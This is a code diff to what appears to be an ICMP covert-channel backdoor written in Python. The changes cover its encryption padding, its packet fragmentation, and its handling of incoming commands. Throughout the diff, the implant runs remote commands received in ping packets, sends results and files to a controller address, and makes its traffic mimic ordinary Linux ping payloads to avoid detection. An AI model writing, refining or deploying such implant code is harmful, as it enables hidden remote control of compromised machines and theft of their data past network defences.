@@ -25,15 +25,22 @@ DEFAULT_RAILFENCE_RAILS = 4
 DEFAULT_BIT_RAILFENCE_RAILS = 7		# Set at >=2
 HANDSHAKE_PREFIX = b"SYNC:"
 ACK_PREFIX = b"ACK:"
-PROBE_COMMAND = b"probe"  
+PROBE_COMMAND = b"ALIVE"  
 FRAGMENTATION_THRESHOLD = 48
-FRAG_SIZE = 48
-FRAG_START = b"FRAG_START:"
-FRAG_PREFIX = b"FRAG:"
 PADDING_MIN = 1
 PADDING_MAX = 5
 REDUNDANCY_FACTOR = 0.1  
 FRAG_TIMEOUT = 60  
+
+TARGET_PAYLOAD_SIZE = 56
+INNER_TARGET_SIZE = 30
+FRAG_SIZE = 48
+FRAG_START = b"FRAG_START:"
+FRAG_PREFIX = b"FRAG:"
+FRAG_START_ECHO = b'FS:'
+FRAG_PREFIX_ECHO = b'F:'
+FIXED_PADDING = bytes.fromhex('20 21 22 23 24 25 26 27 28 29 2a 2b 2c 2d 2e 2f 30 31 32 33 34 35 36 37')
+FRAG_SIZE_ECHO = INNER_TARGET_SIZE - (4 + len(FRAG_PREFIX_ECHO) + 4)
 
 firewall_marker = None
 
@@ -291,10 +298,21 @@ def layered_encrypt(data, padding_seed=None, sub_table=None, shift=DEFAULT_SHIFT
         if random.random() < 0.5:
             data = minor_funcs[op](data)
     data = struct.pack('!H', len(data)) + data
-    mimic_seed = padding_seed ^ len(data) if padding_seed is not None else 0
-    pad_len = random.randint(16, 48) if len(data) > 100 else random.randint(8, 24)
-    mimic = generate_linux_mimic_padding(pad_len, mimic_seed)
-    data += mimic
+    if is_echo:
+        pad_needed = TARGET_PAYLOAD_SIZE - len(data) - len(FIXED_PADDING)
+        if pad_needed > 0:
+            data += b'\x00' * pad_needed
+        data += FIXED_PADDING
+    else:
+        current_len = len(data)
+        min_pad = 8 if current_len <= 100 else 16
+        max_pad = 24 if current_len <= 100 else 48
+        mod_needed = (4 - current_len % 4) % 4
+        possible_pads = [p for p in range(min_pad, max_pad + 1) if p % 4 == mod_needed]
+        pad_len = random.choice(possible_pads) if possible_pads else min_pad
+        mimic_seed = padding_seed ^ len(data) if padding_seed is not None else 0
+        mimic = generate_linux_mimic_padding(pad_len, mimic_seed)
+        data += mimic
     return data
 
 def layered_decrypt(data, sub_table=None, shift=DEFAULT_SHIFT_VALUE, railfence_rails=DEFAULT_RAILFENCE_RAILS, bit_rails=DEFAULT_BIT_RAILFENCE_RAILS, layers=None, selected_ops=None, padding_seed=None):
@@ -351,10 +369,21 @@ def light_encrypt(data, padding_seed=None, sub_table=None, shift=DEFAULT_SHIFT_V
         if random.random() < 0.5:
             data = minor_funcs[op](data)
     data = struct.pack('!H', len(data)) + data
-    mimic_seed = padding_seed ^ len(data) if padding_seed is not None else 0
-    pad_len = random.randint(16, 48) if len(data) > 100 else random.randint(8, 24)
-    mimic = generate_linux_mimic_padding(pad_len, mimic_seed)
-    data += mimic
+    if is_echo:
+        pad_needed = TARGET_PAYLOAD_SIZE - len(data) - len(FIXED_PADDING)
+        if pad_needed > 0:
+            data += b'\x00' * pad_needed
+        data += FIXED_PADDING
+    else:
+        current_len = len(data)
+        min_pad = 8 if current_len <= 100 else 16
+        max_pad = 24 if current_len <= 100 else 48
+        mod_needed = (4 - current_len % 4) % 4
+        possible_pads = [p for p in range(min_pad, max_pad + 1) if p % 4 == mod_needed]
+        pad_len = random.choice(possible_pads) if possible_pads else min_pad
+        mimic_seed = padding_seed ^ len(data) if padding_seed is not None else 0
+        mimic = generate_linux_mimic_padding(pad_len, mimic_seed)
+        data += mimic
     return data
 
 def light_decrypt(data, sub_table=None, shift=DEFAULT_SHIFT_VALUE, railfence_rails=DEFAULT_RAILFENCE_RAILS, bit_rails=DEFAULT_BIT_RAILFENCE_RAILS, layers=None, selected_ops=None, padding_seed=None):
@@ -468,18 +497,20 @@ def get_dummy_payload(icmp_type, icmp_id, seq, poly_seed=None, mutation_count=3)
     else:
         mode = 0
     base_dummy = _get_base_dummy(icmp_type, icmp_id, seq)
-    if mode == 0:
-        return base_dummy
-    elif mode == 1:
-        return base_dummy[::-1]
+    mutated_dummy = base_dummy
+    if mode == 1:
+        mutated_dummy = base_dummy[::-1]
     elif mode == 2:
-        return bytes((b ^ (seq & 0xFF)) for b in base_dummy)
+        mutated_dummy = bytes((b ^ (seq & 0xFF)) for b in base_dummy)
     elif mode == 3:
         insert = random.randbytes(2)
-        return insert + base_dummy
+        mutated_dummy = insert + base_dummy
     elif mode == 4:
-        return base_dummy + b'\x00' * random.randint(1, 4)
-    return base_dummy
+        mutated_dummy = base_dummy + b'\x00' * random.randint(1, 4)
+    pad_bytes = (4 - len(mutated_dummy) % 4) % 4
+    if pad_bytes > 0:
+        mutated_dummy += random.randbytes(pad_bytes)
+    return mutated_dummy
 
 def derive_prefixes(seed):
     hash_obj = hashlib.sha256(seed.encode())
@@ -561,18 +592,24 @@ def send_output(controller_ip, output, orig_seq, rep_type, icmp_id, out_prefix, 
         data = actual_payload[len(out_prefix):]
         data = lzma.compress(data) if is_file else data
         encrypted_data = layered_encrypt(data, padding_seed, sub_table, shift, railfence_rails, bit_rails, layers, selected_ops)
+        if is_echo and len(encrypted_data) % FRAG_SIZE_ECHO != 0:
+            pad_needed = FRAG_SIZE_ECHO - (len(encrypted_data) % FRAG_SIZE_ECHO)
+            encrypted_data += b'\x00' * pad_needed
         overall_hash = hashlib.sha256(encrypted_data).digest()
+        if is_echo:
+            overall_hash = overall_hash[:16]
         frags = []
         i = 0
+        frag_size_val = FRAG_SIZE_ECHO if is_echo else FRAG_SIZE
         while i < len(encrypted_data):
-            frag_size = FRAG_SIZE if is_echo else FRAG_SIZE + random.randint(-10, 10)
+            frag_size = frag_size_val if is_echo else frag_size_val + random.randint(-10, 10)
             frag_size = max(1, min(frag_size, len(encrypted_data) - i))
             frags.append(encrypted_data[i:i+frag_size])
             i += frag_size
         total_frags = len(frags)
-        frag_id = random.randbytes(4)
+        frag_id = random.randbytes(4 if not is_echo else 2)
 
-        init_payload = out_prefix + FRAG_START + struct.pack('!4sI32s', frag_id, total_frags, overall_hash)
+        init_payload = out_prefix + (FRAG_START_ECHO if is_echo else FRAG_START) + struct.pack('!2sH16s' if is_echo else '!4sI32s', frag_id, total_frags, overall_hash)
         encrypted_init = light_encrypt(init_payload, padding_seed, sub_table, shift, railfence_rails, bit_rails, layers, selected_ops)
         time.sleep(compute_delay(delay_mode, delay_min, delay_max))
         send_packet(controller_ip, rep_type, icmp_id, orig_seq, encrypted_init, family, proto, poly_seed, mutation_count)
@@ -654,16 +691,22 @@ def receive_commands(req_type, rep_type, icmp_id, family, proto, local_ip):
                             payload = light_decrypt(encrypted_payload, sub_table, shift, railfence_rails, bit_rails, layers, selected_ops, padding_seed=padding_seed)
                         if payload.startswith(cmd_prefix):
                             rest = payload[len(cmd_prefix):]
-                            if rest.startswith(FRAG_START):
-                                if len(rest) < len(FRAG_START) + 40:
+                            frag_start_val = FRAG_START_ECHO if is_echo else FRAG_START
+                            frag_prefix_val = FRAG_PREFIX_ECHO if is_echo else FRAG_PREFIX
+                            if rest.startswith(frag_start_val):
+                                unpack_fmt = '!2sH16s' if is_echo else '!4sI32s'
+                                unpack_len = 20 if is_echo else 40
+                                if len(rest) < len(frag_start_val) + unpack_len:
                                     continue
-                                frag_id, total_frags, overall_hash = struct.unpack('!4sI32s', rest[len(FRAG_START):len(FRAG_START)+40])
+                                frag_id, total_frags, overall_hash = struct.unpack(unpack_fmt, rest[len(frag_start_val):len(frag_start_val)+unpack_len])
                                 frag_buffers[frag_id] = {'frags': {}, 'total': total_frags, 'hash': overall_hash, 'ts': time.time()}
-                            elif rest.startswith(FRAG_PREFIX):
-                                if len(rest) < len(FRAG_PREFIX) + 8:
+                            elif rest.startswith(frag_prefix_val):
+                                unpack_fmt = '!2sH' if is_echo else '!4sI'
+                                unpack_len = 4 if is_echo else 8
+                                if len(rest) < len(frag_prefix_val) + unpack_len:
                                     continue
-                                frag_id, num = struct.unpack('!4sI', rest[len(FRAG_PREFIX):len(FRAG_PREFIX)+8])
-                                frag_data = rest[len(FRAG_PREFIX)+8:]
+                                frag_id, num = struct.unpack(unpack_fmt, rest[len(frag_prefix_val):len(frag_prefix_val)+unpack_len])
+                                frag_data = rest[len(frag_prefix_val)+unpack_len:]
                                 if frag_id in frag_buffers:
                                     buf = frag_buffers[frag_id]
                                     if time.time() - buf['ts'] > FRAG_TIMEOUT:
@@ -673,7 +716,8 @@ def receive_commands(req_type, rep_type, icmp_id, family, proto, local_ip):
                                     buf['ts'] = time.time()
                                     if len(buf['frags']) == buf['total']:
                                         assembled_encrypted = b''.join(buf['frags'].get(i, b'') for i in range(buf['total']))
-                                        if hashlib.sha256(assembled_encrypted).digest() == buf['hash']:
+                                        hash_check = hashlib.sha256(assembled_encrypted).digest()[:16] if is_echo else hashlib.sha256(assembled_encrypted).digest()
+                                        if hash_check == buf['hash']:
                                             assembled = layered_decrypt(assembled_encrypted, sub_table, shift, railfence_rails, bit_rails, layers, selected_ops, padding_seed=padding_seed)
                                             try:
                                                 assembled = lzma.decompress(assembled)
@@ -688,7 +732,7 @@ def receive_commands(req_type, rep_type, icmp_id, family, proto, local_ip):
                                                     try:
                                                         compressed_data = base64.b64decode(encoded_data)
                                                         file_data = lzma.decompress(compressed_data)
-                                                        with open(target_path, 'wb') as f:
+                                                        with open(os.path.join(target_path, filename), 'wb') as f:
                                                             f.write(file_data)
                                                         output = f"UPLOAD_SUCCESS: {filename} uploaded to {target_path}"
                                                     except Exception as e:
@@ -718,7 +762,7 @@ def receive_commands(req_type, rep_type, icmp_id, family, proto, local_ip):
                                         del frag_buffers[frag_id]
                             else:
                                 command = rest.decode('utf-8', errors='ignore').strip()
-                                if command == "probe":
+                                if command == "ALIVE":
                                     send_output(addr[0], "ALIVE", pkt_seq, rep_type, icmp_id, out_prefix, padding_seed, sub_table, shift, railfence_rails, bit_rails, family, proto, poly_seed=poly_seed, mutation_count=mutation_count, delay_mode=delay_mode, delay_min=delay_min, delay_max=delay_max, layers=layers, selected_ops=selected_ops)
                                 else:
                                     print(f"Executing: {command}")
@@ -734,7 +778,7 @@ def receive_commands(req_type, rep_type, icmp_id, family, proto, local_ip):
                                     trans = frag_transfers[fid]
                                     if trans['sent'] < len(trans['frags']):
                                         num, frag_data = trans['frags'][trans['sent']]
-                                        frag_payload = out_prefix + FRAG_PREFIX + struct.pack('!4sI', fid, num) + frag_data
+                                        frag_payload = out_prefix + (FRAG_PREFIX_ECHO if is_echo else FRAG_PREFIX) + struct.pack('!2sH' if is_echo else '!4sI', fid, num) + frag_data
                                         encrypted_frag = light_encrypt(frag_payload, padding_seed, sub_table, shift, railfence_rails, bit_rails, layers, selected_ops)
                                         time.sleep(random.uniform(0.005, 0.05))
                                         send_packet(addr[0], rep_type, icmp_id, pkt_seq, encrypted_frag, family, proto, poly_seed, mutation_count)
